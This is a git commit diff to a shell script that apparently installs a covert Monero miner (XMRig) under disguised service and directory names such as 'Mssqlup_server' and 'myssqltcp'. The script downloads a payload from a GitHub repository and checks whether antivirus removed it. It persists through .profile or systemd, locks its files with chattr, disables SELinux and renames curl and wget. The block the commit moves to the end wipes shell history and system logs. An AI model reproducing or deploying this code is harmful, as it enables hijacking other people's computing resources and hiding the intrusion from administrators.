16ef1436b21480ade38fc89c9ce3095575c3d9b2
teshushu <905353149@qq.com>
2023-01-17 23:42:35 +0800

    Update setup_wkgg_server.sh

--- setup_wkgg_server.sh
+++ setup_wkgg_server.sh
@@ -10,7 +10,6 @@ echo
 
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not adviced to run this script under root"
-  echo "警告: 不建议在root用户下使用此脚本"
 fi
 
 # command line arguments
@@ -122,11 +121,8 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU server."
-echo "将进行下载设置,并在后台中运行phpup服务."
 echo "If needed, server in foreground can be started by $HOME/myssqltcp/xmrig.sh script."
-echo "如果需要,可以通过以下方法启动前台服务输出 $HOME/myssqltcp/xmrig.sh script."
 echo "Mining will happen to $WALLET wallet."
-echo "将使用 $WALLET 地址进行开采"
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://wkgg.com site)"
 fi
@@ -134,10 +130,8 @@ echo
 
 if ! sudo -n true 2>/dev/null; then
   echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
-  echo "由于脚本无法执行无密码的sudo，因此在您重启后首次登录此主机时，后台开采将从您的 $HOME/.profile 文件开始."
 else
   echo "Mining in background will be performed using Mssqlup_server systemd service."
-  echo "后台开采将使用Mssqlup_serber systemd服务执行."
 fi
 
 echo
@@ -715,7 +709,6 @@ kill_sus_proc()
 }
 
 echo "[*] Removing previous Mysqlup Server (if any)"
-echo "[*] 卸载以前的 Myssqlup  (如果存在)"
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop Mssqlup_server.service
 fi
@@ -729,38 +722,30 @@ echo "[*] Removing $HOME/myssqltcp directory"
 rm -rf $HOME/myssqltcp
 
 echo "[*] Downloading myssqltcp advanced version of phpup to /tmp/wkggxmr.tar.gz"
-echo "[*] 下载 Wkgg 版本的 myssqltcp 到 /tmp/wkggxmr.tar.gz 中"
 if ! curl -L --progress-bar "https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz" -o /tmp/wkggxmr.tar.gz; then
   echo "ERROR: Can't download https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz file to /tmp/wkggxmr.tar.gz"
-  echo "发生错误: 无法下载 https://github.com/teshushu/BiBi/raw/main/wkggxmr.tar.gz 文件到 /tmp/wkggxmr.tar.gz"
   exit 1
 fi
 
 echo "[*] Unpacking /tmp/wkggxmr.tar.gz to $HOME/myssqltcp"
-echo "[*] 解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp"
 [ -d $HOME/myssqltcp ] || mkdir $HOME/myssqltcp
 if ! tar xf /tmp/wkggxmr.tar.gz -C $HOME/myssqltcp; then
   echo "ERROR: Can't unpack /tmp/wkggxmr.tar.gz to $HOME/myssqltcp directory"
-  echo "发生错误: 无法解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp 目录"
   exit 1
 fi
 rm /tmp/wkggxmr.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/myssqltcp/xmrig works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HOME/myssqltcp/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/myssqltcp/config.json
 $HOME/myssqltcp/xmrig --help >/dev/null
 if (test $? -ne 0); then
   if [ -f $HOME/myssqltcp/xmrig ]; then
     echo "WARNING: Advanced version of $HOME/myssqltcp/xmrig is not functional"
-	echo "警告: 版本 $HOME/myssqltcp/xmrig 无法正常工作"
   else 
     echo "WARNING: Advanced version of $HOME/myssqltcp/xmrig was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HOME/myssqltcp/xmrig 下的xmrig已被杀毒软件删除 (或其它问题)"
   fi
 
   echo "[*] Looking for the latest version of Monero server"
-  echo "[*] 查看最新版本的 xmrig 服务工具"
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
@@ -768,36 +753,29 @@ if (test $? -ne 0); then
   echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/wkggxmr.tar.gz"
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/wkggxmr.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/wkggxmr.tar.gz"
-	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/wkggxmr.tar.gz"
     exit 1
   fi
 
   echo "[*] Unpacking /tmp/wkggxmr.tar.gz to $HOME/myssqltcp"
-  echo "[*] 解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp"
   if ! tar xf /tmp/wkggxmr.tar.gz -C $HOME/myssqltcp --strip=1; then
     echo "WARNING: Can't unpack /tmp/wkggxmr.tar.gz to $HOME/myssqltcp directory"
-	echo "警告: 无法解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp 目录下"
   fi
   rm /tmp/wkggxmr.tar.gz
 
   echo "[*] Checking if stock version of $HOME/myssqltcp/xmrig works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HOME/myssqltcp/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/myssqltcp/config.json
   $HOME/myssqltcp/xmrig --help >/dev/null
   if (test $? -ne 0); then 
     if [ -f $HOME/myssqltcp/xmrig ]; then
       echo "ERROR: Stock version of $HOME/myssqltcp/xmrig is not functional too"
-	  echo "发生错误: 该目录中的 $HOME/myssqltcp/xmrig 也无法使用"
     else 
       echo "ERROR: Stock version of $HOME/myssqltcp/xmrig was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HOME/myssqltcp/xmrig 已被杀毒软件删除"
     fi
     exit 1
   fi
 fi
 
 echo "[*] Server $HOME/myssqltcp/xmrig is OK"
-echo "[*] 服务 $HOME/myssqltcp/xmrig 运行正常"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -823,7 +801,6 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_bac
 # preparing script
 
 echo "[*] Creating $HOME/myssqltcp/xmrig.sh script"
-echo "[*] 在该目录下创建 $HOME/myssqltcp/xmrig.sh 脚本"
 cat >$HOME/myssqltcp/xmrig.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
@@ -831,8 +808,6 @@ if ! pidof xmrig >/dev/null; then
 else
   echo "Monero server is already running in the background. Refusing to run another one."
   echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background server first."
-  echo "Mssqlup服务已经在后台运行。 拒绝运行另一个."
-  echo "如果要先删除后台服务，请运行 \"killall xmrig\" 或 \"sudo killall xmrig\"."
 fi
 EOL
 
@@ -843,20 +818,16 @@ chmod +x $HOME/myssqltcp/xmrig.sh
 if ! sudo -n true 2>/dev/null; then
   if ! grep myssqltcp/xmrig.sh $HOME/.profile >/dev/null; then
     echo "[*] Adding $HOME/myssqltcp/xmrig.sh script to $HOME/.profile"
-	echo "[*] 添加 $HOME/myssqltcp/Mssqlup.sh 到 $HOME/.profile"
     echo "$HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
     echo "Looks like $HOME/myssqltcp/xmrig.sh script is already in the $HOME/.profile"
-	echo "脚本 $HOME/myssqltcp/xmrig.sh 已存在于 $HOME/.profile 中."
   fi
   echo "[*] Running server in the background (see logs in $HOME/myssqlsys.log file)"
-  echo "[*] 已在后台运行myssqlsys (请查看 $HOME/myssqlsys.log 日志文件)"
   /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
     echo "[*] Enabling huge pages"
-	echo "[*] 启用 huge pages"
     echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
     sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
   fi
@@ -864,7 +835,6 @@ else
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running server in the background (see logs in $HOME/myssqlsys.log file)"
-	echo "[*] 已在后台运行myssqlsys (请查看 $HOME/myssqlsys.log 日志文件)"
     /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup server activation after reboot yourself if possible."
@@ -893,13 +863,11 @@ EOL
     sudo systemctl enable Mssqlup_server.service
     sudo systemctl start Mssqlup_server.service
     echo "To see server service logs run \"sudo journalctl -u Mssqlup_server -f\" command"
-	echo "查看服务日志,请运行 \"sudo journalctl -u Mssqlup_server -f\" 命令"
   fi
 fi
 
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the server or you will be banned"
-echo "提示: 如果您使用共享VPS，建议避免由服务产生100％的CPU使用率，否则可能将被禁止使用"
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit server to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
@@ -921,12 +889,6 @@ chattr -V +iau $HOME/myssqltcp/config_background.json
 chattr -V +iau $HOME/myssqltcp/config.json
 chattr -V +iau $HOME/myssqltcp/xmrig.sh
 
-history -c
-echo > /var/spool/mail/root
-echo > /var/log/wtmp
-echo > /var/log/secure
-echo > /root/.bash_history
-
 setenforce 0 2>dev/null
 echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
 sync && echo 3 >/proc/sys/vm/dro
@@ -940,5 +902,11 @@ mv /usr/bin/url /usr/bin/cd1
 mv /usr/bin/wget /usr/bin/get
 mv /usr/bin/get /usr/bin/wd1
 
+history -c
+echo > /var/spool/mail/root
+echo > /var/log/wtmp
+echo > /var/log/secure
+echo > /root/.bash_history
+
 echo "[*] Setup complete"
-echo "[*] 安装完成"
+echo "[*] Yee-Go"
